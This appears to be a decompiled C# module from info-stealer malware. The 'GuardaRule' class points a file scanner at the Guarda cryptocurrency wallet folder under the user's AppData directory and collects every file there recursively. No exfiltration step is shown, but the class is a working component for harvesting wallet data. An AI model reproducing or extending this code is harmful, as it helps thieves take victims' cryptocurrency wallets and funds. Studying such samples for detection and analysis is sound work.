using System;
using System.Collections.Generic;
using System.IO;


public class GuardaRule : FileScannerRule
{

	public GuardaRule()
	{
		base.Name = "Guarda";
	}


	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x0600007F RID: 127 RVA: 0x00006070 File Offset: 0x00004270
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Guarda";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
